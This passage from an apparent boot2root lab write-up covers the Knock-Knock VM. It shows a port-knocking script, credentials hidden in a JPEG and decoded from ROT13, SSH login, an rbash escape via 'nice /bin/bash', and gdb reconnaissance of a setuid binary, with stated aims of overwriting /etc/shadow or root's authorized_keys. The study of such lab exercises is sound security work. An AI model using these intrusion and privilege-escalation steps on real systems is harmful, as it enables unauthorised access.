</span><span class='line'>    <span class="n">raw_list</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># get the ports in a actual python list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="n">clean_up_ports</span><span class="p">(</span><span class="n">raw_list</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sequence is </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">ports</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knocking on the door using all the possible combinations...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Lets knock all of the possible combinations of the ports list</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port_list</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Knocking with sequence: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">port_list</span><span class="p">,)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">port_list</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Knocking on port </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Finished sequence knock</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knock knock opener&quot;</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this opened the ports every go :)</p>

<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>

<h2>may I burn the door now?</h2>

<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>

<p><img src="https://i.imgur.com/5NdJ65y.png"></p>

<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wget http://192.168.56.203/knockknock.jpg
</span><span class='line'>--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
</span><span class='line'>Connecting to 192.168.56.203:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 84741 <span class="o">(</span>83K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
</span><span class='line'>Saving to: <span class="sb">`</span>knockknock.jpg<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[============&gt;] 84,741      68.2K/s   in 1.2s    </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-14 13:04:35 (68.2 KB/s) - `knockknock.jpg&#39;</span> saved <span class="o">[</span>84741/84741<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>

<p>Next, I ran the image through exiftool:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
</span><span class='line'>ExifTool Version Number         : 8.60
</span><span class='line'>File Name                       : knockknock.jpg
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 83 kB
</span><span class='line'>File Modification Date/Time     : 2014:10:06 18:38:30+02:00
</span><span class='line'>File Permissions                : rw-r--r--
</span><span class='line'>File Type                       : JPEG
</span><span class='line'>MIME Type                       : image/jpeg
</span><span class='line'>JFIF Version                    : 1.02
</span><span class='line'>Resolution Unit                 : None
</span><span class='line'>X Resolution                    : 100
</span><span class='line'>Y Resolution                    : 100
</span><span class='line'>Quality                         : 74%
</span><span class='line'>XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
</span><span class='line'>Marked                          : © Estate of Roy Lichtenstein
</span><span class='line'>Web Statement                   : © Estate of Roy Lichtenstein
</span><span class='line'>Rights                          : © Estate of Roy Lichtenstein
</span><span class='line'>DCT Encode Version              : 100
</span><span class='line'>APP14 Flags 0                   : <span class="o">[</span>14<span class="o">]</span>, Encoded with <span class="nv">Blend</span><span class="o">=</span>1 downsampling
</span><span class='line'>APP14 Flags 1                   : <span class="o">(</span>none<span class="o">)</span>
</span><span class='line'>Color Transform                 : YCbCr
</span><span class='line'>Image Width                     : 650
</span><span class='line'>Image Height                    : 788
</span><span class='line'>Encoding Process                : Baseline DCT, Huffman coding
</span><span class='line'>Bits Per Sample                 : 8
</span><span class='line'>Color Components                : 3
</span><span class='line'>Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
</span><span class='line'>Image Size                      : 650x788
</span></code></pre></td></tr></table></div></figure>


<p>Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>

<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># extract the jpeg data</span>
</span><span class='line'>root@kali:~# recoverjpeg knockknock.jpg
</span><span class='line'>Restored 1 picture
</span><span class='line'>
</span><span class='line'><span class="c"># the output image from the extract</span>
</span><span class='line'>root@kali:~# ls image00000.jpg
</span><span class='line'>image00000.jpg
</span><span class='line'>
</span><span class='line'><span class="c"># the cmp</span>
</span><span class='line'>root@kali:~# cmp image00000.jpg knockknock.jpg
</span><span class='line'>cmp: EOF on image00000.jpg
</span></code></pre></td></tr></table></div></figure>


<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tail -n 1 image00000.jpg
</span><span class='line'>9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9<span class="sb">`</span>��5BV<span class="o">(</span>��&lt;�t�WS�����1h
</span><span class='line'>                                                         ��<span class="se">\�</span>��z<span class="nv">$�</span>��vB��
</span></code></pre></td></tr></table></div></figure>


<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tail -n 4 knockknock.jpg
</span><span class='line'>⭚<span class="p">|</span>U���b��<span class="o">[</span>�k<span class="p">|</span>U�������+<span class="se">\U</span>����<span class="o">]</span>�U¸��qW<span class="p">|</span>U�<span class="o">]</span>�qWX�F��*��kz����<span class="o">]</span>��ѭqV�k튷�P���b��T�<span class="se">\+\U</span>��Wo��9b�&lt;�V��<span class="o">]</span>���B��<span class="o">[</span>�v*�Uثx�X�x�<span class="o">[</span>����o������<span class="p">|</span>U����v*�^��x��Wb�o���b��b��<span class="o">[</span>����qU����צ*����*���qW�
</span><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw9Ow
</span></code></pre></td></tr></table></div></figure>


<p>Hah! Login Credentials sound very promising!! :)</p>

<h2>ceasar opens the door</h2>

<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>

<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>

<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;abfnW&quot;.decode(&quot;rot13&quot;)&#39;</span>
</span><span class='line'>nosaJ
</span></code></pre></td></tr></table></div></figure>


<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;sax2Cw9Ow&quot;.decode(&quot;rot13&quot;)&#39;</span>
</span><span class='line'>fnk2Pj9Bj
</span></code></pre></td></tr></table></div></figure>


<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># username</span>
</span><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;abfnW&quot;.decode(&quot;rot13&quot;)[::-1].lower()&#39;</span>
</span><span class='line'>jason
</span><span class='line'>
</span><span class='line'><span class="c"># password</span>
</span><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;sax2Cw9Ow&quot;.decode(&quot;rot13&quot;)[::-1]&#39;</span>
</span><span class='line'>jB9jP2knf
</span></code></pre></td></tr></table></div></figure>


<p>So to get our first shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/knock-knock# ssh jason@192.168.56.203
</span><span class='line'>jason@192.168.56.203<span class="err">&#39;</span>s password:
</span><span class='line'>
</span><span class='line'>Linux knockknock 3.2.0-4-486 <span class="c">#1 Debian 3.2.60-1+deb7u3 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have new mail.
</span><span class='line'>Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
</span><span class='line'>jason@knockknock:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>no rbash, just no</h2>

<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>-rbash: /dev/null: restricted: cannot redirect output
</span><span class='line'>-rbash: /dev/null: restricted: cannot redirect output
</span></code></pre></td></tr></table></div></figure>


<p>Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>

<h2>tiny file crypter</h2>

<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -lah
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
</span><span class='line'>drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
</span><span class='line'>lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
</span><span class='line'>-rw-r--r-- 1 jason jason 3.4K Sep 25 21:58 .bashrc
</span><span class='line'>-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
</span><span class='line'>-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
</span><span class='line'>-rw------- 1 jason jason 2.4K Oct 11 18:42 .viminfo
</span><span class='line'>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc
</span><span class='line'>_______________________________
</span><span class='line'><span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\ </span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
</span><span class='line'>  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
</span><span class='line'>                <span class="se">\/</span>            <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>    Tiny File Crypter - 1.0
</span><span class='line'>
</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
</span><span class='line'>jason@knockknock:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>

<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>

<p>A sample encryption run can be seen as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># we have a source document</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>cat test.tfc
</span><span class='line'>This is a <span class="nb">test </span>document.
</span><span class='line'>
</span><span class='line'><span class="c"># we run the encryption program over it</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc test.tfc crypt.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'><span class="c"># dump the encrypted file as hex. from the ascii we</span>
</span><span class='line'><span class="c"># can see its no longer human readable</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>xxd crypt.tfc
</span><span class='line'>0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..<span class="err">&quot;</span><span class="p">&amp;</span>..@^.jm
</span><span class='line'>0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j
</span><span class='line'>
</span><span class='line'><span class="c"># the resulting file is owned by root</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l crypt.tfc
</span><span class='line'>-rw-r--r-- 1 root jason 25 Oct 14 08:12 crypt.tfc
</span></code></pre></td></tr></table></div></figure>


<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc crypt.tfc reversed.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>cat reversed.tfc
</span><span class='line'>This is a <span class="nb">test </span>document.
</span></code></pre></td></tr></table></div></figure>


<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>

<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>

<h2>fuzzing &amp; disassembling tfc</h2>

<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>

<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>strings tfc
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'>    Tiny File Crypter - 1.0
</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
</span><span class='line'>&gt;&gt; Filenames need a .tfc extension
</span><span class='line'>&gt;&gt; No symbolic links!
</span><span class='line'>&gt;&gt; Failed to open input file
</span><span class='line'>&gt;&gt; Failed to create the output file
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'><span class="p">;</span>*2<span class="nv">$&quot;</span>
</span><span class='line'>_______________________________
</span><span class='line'><span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\ </span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
</span><span class='line'>  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
</span><span class='line'>                <span class="se">\/</span>            <span class="se">\/</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>

<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>disass main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>   0x08048924 &lt;+0&gt;: push   ebp
</span><span class='line'>   0x08048925 &lt;+1&gt;: mov    ebp,esp
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x0804894e &lt;+42&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x08048951 &lt;+45&gt;:    call   0x80486e6 &lt;cryptFile&gt;    <span class="c">#&lt;---</span>
</span><span class='line'>   0x08048956 &lt;+50&gt;:    <span class="nb">test   </span>eax,eax
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x0804896c &lt;+72&gt;:    ret
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>disass cryptFile
</span><span class='line'>Dump of assembler code <span class="k">for function </span>cryptFile:
</span><span class='line'>   0x080486e6 &lt;+0&gt;: push   ebp
</span><span class='line'>   0x080486e7 &lt;+1&gt;: mov    ebp,esp
</span><span class='line'>   0x080486e9 &lt;+3&gt;: sub    esp,0x1088
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x080488a8 &lt;+450&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x080488ab &lt;+453&gt;:   call   0x8048618 &lt;xcrypt&gt;       <span class="c">#&lt;---</span>
</span><span class='line'>   0x080488b0 &lt;+458&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x08048922 &lt;+572&gt;:   leave
</span><span class='line'>   0x08048923 &lt;+573&gt;:   ret
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>

<p>I also checked out the security features this binary was compiled with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
